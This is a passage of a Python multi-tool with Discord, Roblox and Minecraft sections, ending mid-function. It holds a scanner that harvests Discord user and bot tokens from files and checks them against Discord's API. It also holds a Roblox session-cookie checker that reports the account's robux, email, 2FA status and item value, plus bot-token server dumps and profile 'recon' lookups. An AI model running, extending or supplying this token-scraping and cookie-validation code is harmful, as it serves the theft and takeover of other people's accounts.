        r"(Bot\s+)?([A-Za-z0-9_-]{24,26}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,})"
    )

    files_to_scan = []
    if os.path.isfile(path):
        files_to_scan = [path]
    else:
        for root, dirs, files in os.walk(path):
            # skip obvious binary dirs
            dirs[:] = [d for d in dirs if d not in
                       (".git","node_modules","__pycache__",".venv","venv")]
            for fname in files:
                ext = os.path.splitext(fname)[1].lower()
                if ext in (".py",".js",".ts",".json",".txt",".log",".env",
                           ".cfg",".config",".yml",".yaml",".toml",".ini",""):
                    files_to_scan.append(os.path.join(root, fname))

    _info(f"scanning {len(files_to_scan)} file(s)...")
    found_tokens = []   # [(file, line_no, token, is_bot)]

    for fpath in files_to_scan:
        try:
            with open(fpath, "r", errors="ignore") as f:
                for lineno, line in enumerate(f, 1):
                    for match in TOKEN_RE.finditer(line):
                        prefix = match.group(1) or ""
                        token  = match.group(2)
                        is_bot = bool(prefix.strip())
                        found_tokens.append((fpath, lineno, token, is_bot))
        except Exception:
            pass

    if not found_tokens:
        _warn("no tokens found in scanned files")
        _pause(); return

    console.print(f"\n  [bold green]found {len(found_tokens)} token(s):[/bold green]\n")
    for fpath, lineno, token, is_bot in found_tokens:
        kind = "[cyan]BOT [/cyan]" if is_bot else "[magenta]USER[/magenta]"
        short_path = os.path.relpath(fpath)
        console.print(f"  {kind}  [white]{token}[/white]")
        console.print(f"        [grey50]{short_path}:{lineno}[/grey50]")

        # decode creation date from token
        try:
            seg = token.split(".")[0]
            seg += "=" * (-len(seg) % 4)
            uid = base64.b64decode(seg).decode(errors="replace").strip()
            if uid.isdigit():
                dt = _snowflake_to_dt(int(uid))
                console.print(f"        [grey50]account created: {_fmt_dt(dt)}[/grey50]")
        except Exception:
            pass
        console.print()

    # optional validity check
    if _need_req() and _ask("validate found tokens against API? (y/N): ").lower() == "y":
        for _, _, token, is_bot in found_tokens:
            auth = f"Bot {token}" if is_bot else token
            try:
                r = _session().get(
                    "https://discord.com/api/v10/users/@me",
                    headers={"Authorization": auth}, timeout=8
                )
                if r.status_code == 200:
                    d   = r.json()
                    tag = f"@{d.get('username','?')}"
                    console.print(f"  [green]✓ VALID[/green]  [white]{token[:20]}...[/white]  {tag}")
                else:
                    console.print(f"  [red]✗ INVALID[/red]  [grey50]{token[:20]}...[/grey50]  [{r.status_code}]")
            except Exception as e:
                console.print(f"  [red]✗ ERROR[/red]  [grey50]{e}[/grey50]")
            time.sleep(1.0)

    _log("TOKEN_SCRAPE", f"{len(found_tokens)} found")
    _pause()


def disc_server_info():
    """Dump full server info, channels, roles via bot token."""
    if not _need_req(): return
    _header("SERVER INFO DUMP")
    console.print("  [grey50]dumps channels, roles, member count via bot token[/grey50]\n")

    bot_token = _ask("bot token: ").strip()
    guild_id  = _ask("server (guild) ID: ").strip()

    if not bot_token or not guild_id:
        _err("both fields required"); _pause(); return

    auth = f"Bot {bot_token}" if not bot_token.startswith("Bot ") else bot_token
    base = "https://discord.com/api/v10"

    try:
        # guild info
        r = _session().get(f"{base}/guilds/{guild_id}?with_counts=true",
                           headers={"Authorization": auth}, timeout=10)
        if r.status_code == 401: _err("invalid token"); _pause(); return
        if r.status_code == 403: _err("bot not in that server"); _pause(); return
        if r.status_code == 404: _err("server not found"); _pause(); return
        g = r.json()

        console.print(f"\n  [bold magenta]── SERVER ───────────────────────────[/bold magenta]")
        console.print(f"  [cyan]{'name':>18}[/cyan]  [bold white]{g.get('name','?')}[/bold white]")
        console.print(f"  [cyan]{'id':>18}[/cyan]  [white]{g.get('id','?')}[/white]")
        console.print(f"  [cyan]{'owner id':>18}[/cyan]  [white]{g.get('owner_id','?')}[/white]")
        console.print(f"  [cyan]{'members':>18}[/cyan]  [white]{g.get('approximate_member_count','?')}[/white]")
        console.print(f"  [cyan]{'online':>18}[/cyan]  [white]{g.get('approximate_presence_count','?')}[/white]")
        console.print(f"  [cyan]{'boost tier':>18}[/cyan]  [white]{g.get('premium_tier','?')} ({g.get('premium_subscription_count',0)} boosts)[/white]")
        console.print(f"  [cyan]{'created':>18}[/cyan]  [white]{_fmt_dt(_snowflake_to_dt(int(guild_id)))}[/white]")
        if g.get("vanity_url_code"):
            console.print(f"  [cyan]{'vanity':>18}[/cyan]  [white]discord.gg/{g['vanity_url_code']}[/white]")

        # channels
        rc = _session().get(f"{base}/guilds/{guild_id}/channels",
                            headers={"Authorization": auth}, timeout=10)
        if rc.status_code == 200:
            channels = rc.json()
            ch_types = {0:"#",1:"DM",2:"🔊",4:"📁",5:"📢",13:"🎭",15:"📋"}
            categories = [c for c in channels if c["type"]==4]
            text_ch    = [c for c in channels if c["type"]==0]
            voice_ch   = [c for c in channels if c["type"]==2]
            other_ch   = [c for c in channels if c["type"] not in (0,2,4)]

            console.print(f"\n  [bold magenta]── CHANNELS ({len(channels)} total) ────────────[/bold magenta]")
            console.print(f"  [grey50]categories: {len(categories)}  text: {len(text_ch)}  "
                          f"voice: {len(voice_ch)}  other: {len(other_ch)}[/grey50]\n")

            # sort by position
            channels.sort(key=lambda c: (c.get("parent_id") or "0", c.get("position",0)))
            for ch in channels[:50]:  # cap at 50 to not spam
                icon  = ch_types.get(ch["type"],"?")
                name  = ch.get("name","?")
                cid   = ch.get("id","?")
                nsfw  = " [red]NSFW[/red]" if ch.get("nsfw") else ""
                console.print(f"  [grey50]{icon}[/grey50] [white]{name:<30}[/white] [grey50]{cid}{nsfw}[/grey50]")
            if len(channels) > 50:
                console.print(f"  [grey50]... and {len(channels)-50} more[/grey50]")

        # roles
        rr = _session().get(f"{base}/guilds/{guild_id}/roles",
                            headers={"Authorization": auth}, timeout=10)
        if rr.status_code == 200:
            roles = sorted(rr.json(), key=lambda r: r.get("position",0), reverse=True)
            console.print(f"\n  [bold magenta]── ROLES ({len(roles)} total) ──────────────[/bold magenta]")
            for role in roles[:30]:
                col_int = role.get("color",0)
                if col_int:
                    r2,g2,b2 = (col_int>>16)&255,(col_int>>8)&255,col_int&255
                    col_str  = f"rgb({r2},{g2},{b2})"
                else:
                    col_str = "grey50"
                perms = int(role.get("permissions",0))
                admin = " [red]ADMIN[/red]" if perms & 8 else ""
                console.print(f"  [{col_str}]●[/{col_str}] [white]{role.get('name','?'):<25}[/white] "
                              f"[grey50]{role.get('id','')}[/grey50]{admin}")
            if len(roles) > 30:
                console.print(f"  [grey50]... and {len(roles)-30} more[/grey50]")

    except Exception as e:
        _err(str(e))

    _log("SERVER_INFO", guild_id)
    _pause()


def disc_account_age_rank():
    """Rank a list of Discord user IDs by account age (oldest first)."""
    _header("ACCOUNT AGE RANKER")
    console.print("  [grey50]paste user IDs one per line — blank line when done[/grey50]\n")
    ids = []
    while True:
        line = console.input("  ").strip()
        if not line: break
        if line.isdigit(): ids.append(int(line))
        else: _warn(f"skipping: {line}")

    if not ids:
        _err("no IDs"); _pause(); return

    ranked = sorted(ids)  # snowflakes sort chronologically
    console.print(f"\n  [bold white]{len(ranked)} accounts ranked oldest → newest:[/bold white]\n")
    now = datetime.now(timezone.utc)
    for rank, uid in enumerate(ranked, 1):
        try:
            dt   = _snowflake_to_dt(uid)
            age  = (now - dt).days
            yrs  = age // 365
            mos  = (age % 365) // 30
            bar_w = 20
            # max age in dataset for relative bar
            max_age = (now - _snowflake_to_dt(ranked[0])).days
            fill  = int(bar_w * age / max(max_age, 1))
            bar   = "[magenta]" + "█"*fill + "[/magenta][grey50]" + "░"*(bar_w-fill) + "[/grey50]"
            console.print(f"  [grey50]{rank:>3}[/grey50]  {bar}  "
                          f"[white]{uid}[/white]  "
                          f"[cyan]{dt.strftime('%Y-%m-%d')}[/cyan]  "
                          f"[grey50]{yrs}y {mos}m[/grey50]")
        except:
            console.print(f"  [grey50]{rank:>3}[/grey50]  [red]{uid} — invalid[/red]")

    _log("AGE_RANK", f"{len(ids)} IDs")
    _pause()



# ═════════════════════════════════════════════════════════════
#  ── SECTION 10 : ROBLOX TOOLS ───────────────────────────────
# ═════════════════════════════════════════════════════════════

_RBLX_API  = "https://users.roblox.com/v1"
_RBLX_THUMB= "https://thumbnails.roblox.com/v1"
_RBLX_ECON = "https://economy.roblox.com/v1"
_RBLX_GAME = "https://games.roblox.com/v1"
_RBLX_GRP  = "https://groups.roblox.com/v1"
_RBLX_FRNDS= "https://friends.roblox.com/v1"
_RBLX_PRES = "https://presence.roblox.com/v1"

_SESSION_START = time.time()
_SESSION_ACTIONS = [0]

def _rblx_get(url, cookie=None):
    s = _session()
    if cookie:
        s.cookies.set(".ROBLOSECURITY", cookie, domain=".roblox.com")
    return s.get(url, timeout=10)

def _rblx_uid(username: str) -> int | None:
    """Resolve Roblox username → user ID."""
    r = _session().post(
        "https://users.roblox.com/v1/usernames/users",
        json={"usernames": [username], "excludeBannedUsers": False},
        timeout=10
    )
    if r.status_code == 200:
        data = r.json().get("data", [])
        if data: return data[0].get("id")
    return None

def rblx_user():
    if not _need_req(): return
    _header("ROBLOX USER LOOKUP")
    console.print("  [grey50]full profile recon — join date, RAP, friends, badges, status[/grey50]\n")

    raw = _ask("username or user ID: ").strip()
    if not raw: _err("no input"); _pause(); return

    # resolve to ID
    if raw.isdigit():
        uid = int(raw)
    else:
        uid = _rblx_uid(raw)
        if not uid: _err(f"user '{raw}' not found"); _pause(); return

    try:
        # basic profile
        r = _rblx_get(f"{_RBLX_API}/users/{uid}")
        if r.status_code == 404: _err("user not found / banned"); _pause(); return
        d = r.json()

        name        = d.get("name","?")
        display     = d.get("displayName","?")
        desc        = d.get("description","").strip()[:120] or "—"
        created     = d.get("created","?")[:10]
        banned      = d.get("isBanned", False)
        verified    = d.get("hasVerifiedBadge", False)
        external_id = d.get("externalAppDisplayName") or "—"

        console.print(f"\n  [bold magenta]── PROFILE ──────────────────────────[/bold magenta]")
        console.print(f"  [cyan]{'username':>16}[/cyan]  [bold white]{name}[/bold white]{'  [red]BANNED[/red]' if banned else ''}{'  [green]✓ VERIFIED[/green]' if verified else ''}")
        console.print(f"  [cyan]{'display name':>16}[/cyan]  [white]{display}[/white]")
        console.print(f"  [cyan]{'user id':>16}[/cyan]  [white]{uid}[/white]")
        console.print(f"  [cyan]{'joined':>16}[/cyan]  [white]{created}[/white]")
        console.print(f"  [cyan]{'description':>16}[/cyan]  [grey50]{desc}[/grey50]")

        # friends / followers / following counts
        try:
            fc = _rblx_get(f"{_RBLX_FRNDS}/users/{uid}/followers/count").json().get("count","?")
            fg = _rblx_get(f"{_RBLX_FRNDS}/users/{uid}/followings/count").json().get("count","?")
            fr = _rblx_get(f"{_RBLX_FRNDS}/users/{uid}/friends/count").json().get("count","?")
            console.print(f"  [cyan]{'friends':>16}[/cyan]  [white]{fr}[/white]  [grey50]followers: {fc}  following: {fg}[/grey50]")
        except: pass

        # RAP (recent average price — from inventory/collectibles)
        try:
            rap_r = _rblx_get(f"https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?sortOrder=Asc&limit=100")
            if rap_r.status_code == 200:
                items = rap_r.json().get("data", [])
                rap   = sum(i.get("recentAveragePrice",0) for i in items)
                console.print(f"  [cyan]{'RAP':>16}[/cyan]  [{'yellow' if rap > 0 else 'grey50'}]R$ {rap:,}[/{'yellow' if rap > 0 else 'grey50'}]  [grey50]({len(items)} limiteds)[/grey50]")
        except: pass

        # presence (online status)
        try:
            pr = _session().post(
                f"{_RBLX_PRES}/presence/users",
                json={"userIds": [uid]}, timeout=8
            ).json().get("userPresences",[])
            if pr:
                ptype = {0:"Offline",1:"Online (Website)",2:"In-Game",3:"In Studio"}.get(pr[0].get("userPresenceType",0),"?")
                game  = pr[0].get("lastLocation","")
                col   = "green" if pr[0].get("userPresenceType",0) > 0 else "grey50"
                console.print(f"  [cyan]{'status':>16}[/cyan]  [{col}]{ptype}[/{col}]{'  '+game if game else ''}")
        except: pass

        # avatar headshot URL
        try:
            av = _rblx_get(
                f"{_RBLX_THUMB}/users/avatar-headshot?userIds={uid}&size=420x420&format=Png"
            ).json().get("data",[])
            if av:
                console.print(f"  [cyan]{'avatar':>16}[/cyan]  [blue]{av[0].get('imageUrl','?')}[/blue]")
        except: pass

        # profile link
        console.print(f"  [cyan]{'profile':>16}[/cyan]  [blue]https://www.roblox.com/users/{uid}/profile[/blue]")

        _SESSION_ACTIONS[0] += 1
        _log("RBLX_USER", f"{name} ({uid})")
    except Exception as e:
        _err(str(e))
    _pause()


def rblx_game():
    if not _need_req(): return
    _header("ROBLOX GAME INFO")
    console.print("  [grey50]full game recon — players, visits, rating, creator[/grey50]\n")

    raw = _ask("game/place ID (from URL): ").strip()
    if not raw.isdigit(): _err("numeric ID only"); _pause(); return
    place_id = int(raw)

    try:
        # get universe ID from place ID
        ur = _rblx_get(f"https://apis.roblox.com/universes/v1/places/{place_id}/universe")
        if ur.status_code != 200: _err("place not found"); _pause(); return
        universe_id = ur.json().get("universeId")

        # game details
        gr = _rblx_get(f"{_RBLX_GAME}/games?universeIds={universe_id}")
        if gr.status_code != 200: _err("game data unavailable"); _pause(); return
        g = gr.json().get("data", [{}])[0]

        name      = g.get("name","?")
        desc      = (g.get("description") or "—").strip()[:150]
        creator   = g.get("creator",{})
        cr_name   = creator.get("name","?")
        cr_type   = creator.get("type","?")
        playing   = g.get("playing",0)
        visits    = g.get("visits",0)
        favs      = g.get("favoritedCount",0)
        up_votes  = g.get("totalUpVotes",0)
        dn_votes  = g.get("totalDownVotes",0)
        total_v   = up_votes + dn_votes
        rating    = f"{up_votes/total_v*100:.1f}%" if total_v else "N/A"
        max_play  = g.get("maxPlayers",0)
        created   = g.get("created","?")[:10]
        updated   = g.get("updated","?")[:10]
        genre     = g.get("genre","?")
        price     = g.get("price") or "Free"
        is_private= g.get("isPrivate", False)
        copylock  = g.get("copyingAllowed", True)

        console.print(f"\n  [bold magenta]── GAME ─────────────────────────────[/bold magenta]")
        console.print(f"  [cyan]{'name':>18}[/cyan]  [bold white]{name}[/bold white]{'  [red]PRIVATE[/red]' if is_private else ''}")
        console.print(f"  [cyan]{'universe id':>18}[/cyan]  [white]{universe_id}[/white]")
        console.print(f"  [cyan]{'place id':>18}[/cyan]  [white]{place_id}[/white]")
        console.print(f"  [cyan]{'creator':>18}[/cyan]  [white]{cr_name}[/white]  [grey50]({cr_type})[/grey50]")
        console.print(f"  [cyan]{'genre':>18}[/cyan]  [white]{genre}[/white]")
        console.print(f"  [cyan]{'price':>18}[/cyan]  [white]{price}[/white]")
        console.print(f"  [cyan]{'playing now':>18}[/cyan]  [green]{playing:,}[/green]")
        console.print(f"  [cyan]{'total visits':>18}[/cyan]  [white]{visits:,}[/white]")
        console.print(f"  [cyan]{'favorites':>18}[/cyan]  [white]{favs:,}[/white]")
        console.print(f"  [cyan]{'rating':>18}[/cyan]  [{'green' if up_votes>dn_votes else 'red'}]{rating}[/{'green' if up_votes>dn_votes else 'red'}]  [grey50]👍{up_votes:,} 👎{dn_votes:,}[/grey50]")
        console.print(f"  [cyan]{'max players':>18}[/cyan]  [white]{max_play}[/white]")
        console.print(f"  [cyan]{'created':>18}[/cyan]  [white]{created}[/white]")
        console.print(f"  [cyan]{'last updated':>18}[/cyan]  [white]{updated}[/white]")
        console.print(f"  [cyan]{'copy locked':>18}[/cyan]  [{'red' if not copylock else 'green'}]{not copylock}[/{'red' if not copylock else 'green'}]")
        if desc and desc != "—":
            console.print(f"  [cyan]{'description':>18}[/cyan]  [grey50]{desc}[/grey50]")
        console.print(f"  [cyan]{'link':>18}[/cyan]  [blue]https://www.roblox.com/games/{place_id}[/blue]")

        # thumbnail
        try:
            th = _rblx_get(
                f"{_RBLX_THUMB}/games/multiget/thumbnails?universeIds={universe_id}&size=768x432&format=Png&countPerUniverse=1"
            ).json().get("data",[])
            if th and th[0].get("thumbnails"):
                img_url = th[0]["thumbnails"][0].get("imageUrl","")
                if img_url:
                    console.print(f"  [cyan]{'thumbnail':>18}[/cyan]  [blue]{img_url}[/blue]")
        except: pass

        _SESSION_ACTIONS[0] += 1
        _log("RBLX_GAME", str(place_id))
    except Exception as e:
        _err(str(e))
    _pause()


def rblx_group():
    if not _need_req(): return
    _header("ROBLOX GROUP INFO")
    console.print("  [grey50]group recon — owner, members, funds (if public), roles[/grey50]\n")

    gid = _ask("group ID: ").strip()
    if not gid.isdigit(): _err("numeric ID only"); _pause(); return

    try:
        r = _rblx_get(f"{_RBLX_GRP}/groups/{gid}")
        if r.status_code == 404: _err("group not found"); _pause(); return
        g = r.json()

        name    = g.get("name","?")
        desc    = (g.get("description") or "—").strip()[:150]
        owner   = g.get("owner") or {}
        ow_name = owner.get("username","?")
        ow_id   = owner.get("userId","?")
        members = g.get("memberCount",0)
        public  = g.get("publicEntryAllowed", True)
        verified= g.get("hasVerifiedBadge", False)
        shout   = (g.get("shout") or {}).get("body","—")

        console.print(f"\n  [bold magenta]── GROUP ─────────────────────────────[/bold magenta]")
        console.print(f"  [cyan]{'name':>16}[/cyan]  [bold white]{name}[/bold white]{'  [green]✓ VERIFIED[/green]' if verified else ''}")
        console.print(f"  [cyan]{'group id':>16}[/cyan]  [white]{gid}[/white]")
        console.print(f"  [cyan]{'owner':>16}[/cyan]  [white]{ow_name}[/white]  [grey50](ID: {ow_id})[/grey50]")
        console.print(f"  [cyan]{'members':>16}[/cyan]  [white]{members:,}[/white]")
        console.print(f"  [cyan]{'public join':>16}[/cyan]  [{'green' if public else 'red'}]{public}[/{'green' if public else 'red'}]")
        if shout and shout != "—":
            console.print(f"  [cyan]{'shout':>16}[/cyan]  [grey50]{shout[:100]}[/grey50]")
        if desc and desc != "—":
            console.print(f"  [cyan]{'description':>16}[/cyan]  [grey50]{desc}[/grey50]")

        # roles
        try:
            rr = _rblx_get(f"{_RBLX_GRP}/groups/{gid}/roles").json().get("roles",[])
            if rr:
                console.print(f"\n  [bold magenta]── ROLES ({len(rr)}) ─────────────────────[/bold magenta]")
                for role in sorted(rr, key=lambda x: x.get("rank",0), reverse=True):
                    console.print(f"  [grey50]{role.get('rank',0):>3}[/grey50]  "
                                  f"[white]{role.get('name','?'):<28}[/white]  "
                                  f"[grey50]{role.get('memberCount',0):,} members[/grey50]")
        except: pass

        console.print(f"\n  [cyan]link[/cyan]  [blue]https://www.roblox.com/groups/{gid}[/blue]")
        _SESSION_ACTIONS[0] += 1
        _log("RBLX_GROUP", gid)
    except Exception as e:
        _err(str(e))
    _pause()


def rblx_cookie():
    if not _need_req(): return
    _header("ROBLOX COOKIE CHECKER")
    console.print("  [grey50]validates a .ROBLOSECURITY cookie and dumps account info[/grey50]")
    console.print("  [grey50]only use on cookies you own[/grey50]\n")

    cookie = _ask(".ROBLOSECURITY cookie: ").strip()
    if not cookie: _err("no cookie"); _pause(); return

    # strip prefix if pasted with it
    if cookie.startswith(".ROBLOSECURITY="):
        cookie = cookie[len(".ROBLOSECURITY="):]
    cookie = cookie.strip('"').strip("'")

    try:
        r = _rblx_get("https://users.roblox.com/v1/users/authenticated", cookie=cookie)
        if r.status_code == 401:
            _err("cookie invalid or expired"); _pause(); return
        if r.status_code != 200:
            _err(f"unexpected status {r.status_code}"); _pause(); return

        d    = r.json()
        uid  = d.get("id","?")
        name = d.get("name","?")
        disp = d.get("displayName","?")

        console.print(f"\n  [bold green]✓ COOKIE VALID[/bold green]\n")
        console.print(f"  [cyan]{'username':>16}[/cyan]  [bold white]{name}[/bold white]")
        console.print(f"  [cyan]{'display':>16}[/cyan]  [white]{disp}[/white]")
        console.print(f"  [cyan]{'user id':>16}[/cyan]  [white]{uid}[/white]")

        # robux balance
        try:
            rb = _rblx_get(
                f"https://economy.roblox.com/v1/users/{uid}/currency",
                cookie=cookie
            ).json().get("robux","?")
            console.print(f"  [cyan]{'robux':>16}[/cyan]  [{'green' if int(str(rb).replace(',','')) > 0 else 'grey50'}]R$ {rb}[/{'green' if int(str(rb).replace(',','')) > 0 else 'grey50'}]")
        except: pass

        # premium status
        try:
            pm = _rblx_get(
                f"https://premiumfeatures.roblox.com/v1/users/{uid}/validate-membership",
                cookie=cookie
            )
            is_premium = pm.json() if pm.status_code == 200 else False
            console.print(f"  [cyan]{'premium':>16}[/cyan]  [{'magenta' if is_premium else 'grey50'}]{is_premium}[/{'magenta' if is_premium else 'grey50'}]")
        except: pass

        # 2fa status
        try:
            tfa = _rblx_get(
                "https://twostepverification.roblox.com/v1/users/{}/configuration".format(uid),
                cookie=cookie
            ).json()
            enabled = any(m.get("enabled") for m in tfa.get("methods",[]))
            console.print(f"  [cyan]{'2FA':>16}[/cyan]  [{'green' if enabled else 'red'}]{enabled}[/{'green' if enabled else 'red'}]")
        except: pass

        # email status
        try:
            em = _rblx_get(
                "https://accountinformation.roblox.com/v1/email",
                cookie=cookie
            ).json()
            ev = em.get("emailAddress") or "—"
            verified_em = em.get("verified", False)
            console.print(f"  [cyan]{'email':>16}[/cyan]  [white]{ev}[/white]  [grey50]verified: {verified_em}[/grey50]")
        except: pass

        # RAP
        try:
            rap_r = _rblx_get(
                f"https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?sortOrder=Asc&limit=100",
                cookie=cookie
            )
            if rap_r.status_code == 200:
                items = rap_r.json().get("data",[])
                rap   = sum(i.get("recentAveragePrice",0) for i in items)
                console.print(f"  [cyan]{'RAP':>16}[/cyan]  [yellow]R$ {rap:,}[/yellow]  [grey50]({len(items)} limiteds)[/grey50]")
        except: pass

        console.print(f"  [cyan]{'profile':>16}[/cyan]  [blue]https://www.roblox.com/users/{uid}/profile[/blue]")
        _SESSION_ACTIONS[0] += 1
        _log("RBLX_COOKIE", f"valid:{name}")
    except Exception as e:
        _err(str(e))
    _pause()


def rblx_username_to_id():
    if not _need_req(): return
    _header("ROBLOX USERNAME → ID")
    console.print("  [grey50]bulk resolve usernames to IDs (up to 100 at once)[/grey50]\n")
    console.print("  [grey50]paste usernames one per line, blank to submit[/grey50]\n")

    usernames = []
    while True:
        line = console.input("  ").strip()
        if not line: break
        usernames.append(line)

    if not usernames: _err("no usernames"); _pause(); return

    try:
        r = _session().post(
            "https://users.roblox.com/v1/usernames/users",
            json={"usernames": usernames[:100], "excludeBannedUsers": False},
            timeout=15
        )
        data = r.json().get("data", [])
        found    = {d["requestedUsername"]: d["id"] for d in data}
        not_fnd  = [u for u in usernames if u not in found]

        console.print(f"\n  [bold white]results ({len(found)}/{len(usernames)} found):[/bold white]\n")
        for uname, uid in found.items():
            created = _fmt_dt(_snowflake_to_dt(
                int(str(uid).zfill(17) + "0"*5)
            )) if False else ""  # roblox IDs aren't snowflakes — skip date
            console.print(f"  [green]✓[/green]  [white]{uname:<24}[/white]  [cyan]{uid}[/cyan]")
        for uname in not_fnd:
            console.print(f"  [red]✗[/red]  [grey50]{uname}[/grey50]")

        _SESSION_ACTIONS[0] += 1
        _log("RBLX_UID", f"{len(found)} resolved")
    except Exception as e:
        _err(str(e))
    _pause()


# ═════════════════════════════════════════════════════════════
#  ── SECTION 11 : MINECRAFT TOOLS ────────────────────────────
# ═════════════════════════════════════════════════════════════

_MC_API     = "https://api.mojang.com"
_MC_SESSION = "https://sessionserver.mojang.com"

def mc_uuid():
    if not _need_req(): return
    _header("MINECRAFT USERNAME → UUID")
    console.print("  [grey50]resolves current or past Minecraft username to UUID[/grey50]\n")

    username = _ask("username: ").strip()
    if not username: _err("no username"); _pause(); return

    try:
        r = _session().get(f"{_MC_API}/users/profiles/minecraft/{username}", timeout=10)
        if r.status_code == 404:
            _err(f"'{username}' not found — name may be available or account deleted")
            _pause(); return
        if r.status_code == 204:
            _err("no content returned — username likely doesn't exist"); _pause(); return

        d    = r.json()
        uid  = d.get("id","?")
        name = d.get("name","?")

        # format UUID with dashes
        if len(uid) == 32:
            uid_fmt = f"{uid[:8]}-{uid[8:12]}-{uid[12:16]}-{uid[16:20]}-{uid[20:]}"
        else:
            uid_fmt = uid

        console.print(f"\n  [cyan]{'username':>16}[/cyan]  [bold white]{name}[/bold white]")
        console.print(f"  [cyan]{'UUID':>16}[/cyan]  [white]{uid_fmt}[/white]")
        console.print(f"  [cyan]{'UUID (raw)':>16}[/cyan]  [grey50]{uid}[/grey50]")
        console.print(f"  [cyan]{'skin':>16}[/cyan]  [blue]https://crafatar.com/renders/body/{uid}?overlay[/blue]")
        console.print(f"  [cyan]{'head':>16}[/cyan]  [blue]https://crafatar.com/avatars/{uid}?overlay[/blue]")
        console.print(f"  [cyan]{'namemc':>16}[/cyan]  [blue]https://namemc.com/profile/{uid}[/blue]")

        _SESSION_ACTIONS[0] += 1
        _log("MC_UUID", f"{name}:{uid}")
    except Exception as e:
        _err(str(e))
    _pause()


def mc_profile():
    if not _need_req(): return
    _header("MINECRAFT FULL PROFILE")
    console.print("  [grey50]UUID → full profile with skin/cape data[/grey50]\n")

    raw = _ask("UUID or username: ").strip()
    if not raw: _err("no input"); _pause(); return

    try:
        # resolve username → UUID if needed
        if len(raw.replace("-","")) != 32:
            r = _session().get(f"{_MC_API}/users/profiles/minecraft/{raw}", timeout=10)
            if r.status_code != 200: _err("username not found"); _pause(); return
            uid = r.json().get("id","")
        else:
            uid = raw.replace("-","")

        # get full profile from session server
        r2 = _session().get(f"{_MC_SESSION}/session/minecraft/profile/{uid}?unsigned=false", timeout=10)
        if r2.status_code != 200: _err(f"profile fetch failed [{r2.status_code}]"); _pause(); return

        d    = r2.json()
        name = d.get("name","?")
        props= d.get("properties",[])

        console.print(f"\n  [bold magenta]── PROFILE ──────────────────────────[/bold magenta]")
        console.print(f"  [cyan]{'name':>16}[/cyan]  [bold white]{name}[/bold white]")
        uid_fmt = f"{uid[:8]}-{uid[8:12]}-{uid[12:16]}-{uid[16:20]}-{uid[20:]}"
        console.print(f"  [cyan]{'UUID':>16}[/cyan]  [white]{uid_fmt}[/white]")

        # decode textures property
        for prop in props:
            if prop.get("name") == "textures":
                try:
                    import json as _json
                    raw_b64  = prop.get("value","")
                    raw_b64 += "=" * (-len(raw_b64) % 4)
                    tex_json = _json.loads(base64.b64decode(raw_b64).decode())
                    textures = tex_json.get("textures",{})
                    ts       = tex_json.get("timestamp",0)

                    skin = textures.get("SKIN",{})
                    cape = textures.get("CAPE",{})

                    if skin:
                        skin_url  = skin.get("url","?")
                        slim      = skin.get("metadata",{}).get("model","classic")
                        console.print(f"  [cyan]{'skin model':>16}[/cyan]  [white]{slim}[/white]")
                        console.print(f"  [cyan]{'skin url':>16}[/cyan]  [blue]{skin_url}[/blue]")
                    if cape:
                        console.print(f"  [cyan]{'cape url':>16}[/cyan]  [blue]{cape.get('url','?')}[/blue]")
                    else:
                        console.print(f"  [cyan]{'cape':>16}[/cyan]  [grey50]none[/grey50]")

                    if ts:
                        ts_dt = datetime.fromtimestamp(ts/1000, tz=timezone.utc)
                        console.print(f"  [cyan]{'profile ts':>16}[/cyan]  [grey50]{_fmt_dt(ts_dt)}[/grey50]")
                except Exception as e:
                    _warn(f"texture decode failed: {e}")
                break

        console.print(f"\n  [cyan]{'3D render':>16}[/cyan]  [blue]https://crafatar.com/renders/body/{uid}?overlay=true[/blue]")
        console.print(f"  [cyan]{'namemc':>16}[/cyan]  [blue]https://namemc.com/profile/{uid}[/blue]")

        _SESSION_ACTIONS[0] += 1
        _log("MC_PROFILE", name)
    except Exception as e:
        _err(str(e))
    _pause()


def mc_server():
    if not _need_req(): return
    _header("MINECRAFT SERVER STATUS")
    console.print("  [grey50]live ping — MOTD, players, version, favicon[/grey50]\n")

    host_raw = _ask("server address (e.g. hypixel.net or hypixel.net:25565): ").strip()
    if not host_raw: _err("no address"); _pause(); return

    if ":" in host_raw:
        host, port_s = host_raw.rsplit(":",1)
        try: port = int(port_s)
        except: port = 25565
    else:
        host = host_raw
        port = 25565

    # use mcsrvstat.us API for easy JSON response
    try:
        r = _session().get(f"https://api.mcsrvstat.us/3/{host}:{port}", timeout=12)
        if r.status_code != 200: _err(f"API error {r.status_code}"); _pause(); return
        d = r.json()

        online  = d.get("online", False)
        status_str = "[bold green]ONLINE[/bold green]" if online else "[bold red]OFFLINE[/bold red]"
        console.print(f"\n  [bold magenta]── SERVER STATUS ────────────────────[/bold magenta]")
        console.print(f"  [cyan]{'address':>16}[/cyan]  [white]{host}:{port}[/white]")
        console.print(f"  [cyan]{'status':>16}[/cyan]  {status_str}")

        if online:
            version  = d.get("version","?")
            protocol = d.get("protocol",{}).get("version","?")
            players  = d.get("players",{})
            pl_on    = players.get("online",0)
            pl_max   = players.get("max",0)
            pl_list  = players.get("list",[])
            motd     = " ".join(d.get("motd",{}).get("clean",["—"]))
            software = d.get("software","?")
            plugins  = d.get("plugins",[])
            mods     = d.get("mods",[])
            icon     = "yes" if d.get("icon") else "no"
            hostname = d.get("hostname","?")
            ip_addr  = d.get("ip","?")

            bar_w = 20
            fill  = int(bar_w * pl_on / max(pl_max,1))
            bar   = "[green]"+"█"*fill+"[/green][grey50]"+"░"*(bar_w-fill)+"[/grey50]"

            console.print(f"  [cyan]{'MOTD':>16}[/cyan]  [white]{motd[:80]}[/white]")
            console.print(f"  [cyan]{'version':>16}[/cyan]  [white]{version}[/white]  [grey50]protocol {protocol}[/grey50]")
            console.print(f"  [cyan]{'software':>16}[/cyan]  [white]{software}[/white]")
            console.print(f"  [cyan]{'players':>16}[/cyan]  {bar}  [white]{pl_on}[/white][grey50]/{pl_max}[/grey50]")
            console.print(f"  [cyan]{'ip':>16}[/cyan]  [white]{ip_addr}[/white]  [grey50]{hostname}[/grey50]")
            console.print(f"  [cyan]{'favicon':>16}[/cyan]  [white]{icon}[/white]")
            if plugins:
                console.print(f"  [cyan]{'plugins':>16}[/cyan]  [yellow]{len(plugins)} detected[/yellow]")
                for p in plugins[:10]:
                    console.print(f"  [grey50]{'':>18}{p.get('name','?')} {p.get('version','')}[/grey50]")
            if mods:
